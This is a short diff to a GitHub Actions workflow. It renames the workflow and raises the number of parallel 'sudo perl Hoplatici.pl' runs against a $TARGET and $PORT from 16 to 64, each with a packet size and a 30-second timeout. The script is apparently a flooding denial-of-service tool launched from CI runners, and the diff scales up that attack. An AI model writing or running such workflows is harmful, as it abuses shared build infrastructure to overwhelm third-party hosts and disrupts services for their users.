@@ -1,4 +1,4 @@
-name: Tekil !
+name: Tekil2 !
 
 on:
   workflow_dispatch:
@@ -33,7 +33,7 @@ jobs:
           chmod +x Hoplatici.pl || true
 
           PIDS=()
-          for i in {1..16}; do
+          for i in {1..64}; do
             sudo timeout 30 perl Hoplatici.pl "$TARGET" "$PORT" 1400 30 &
             PIDS+=($!)
           done
